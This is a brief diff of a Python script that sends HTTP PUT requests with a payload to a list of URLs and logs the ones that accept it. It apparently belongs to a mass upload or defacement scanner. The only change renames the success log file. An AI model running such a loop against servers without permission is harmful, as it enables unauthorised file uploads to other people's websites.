@@ -58,7 +58,7 @@ def main():
 			req=requests.Session().put(i+d,data=data)
 			if req.status_code==200:
 				print(Fore.CYAN,"Success==>",Style.RESET_ALL,i+d)
-				f=open("ns-success.txt","a")
+				f=open("faiz.txt","a")
 				f.write(i+d+"\n")
 				f.close()
 			else:
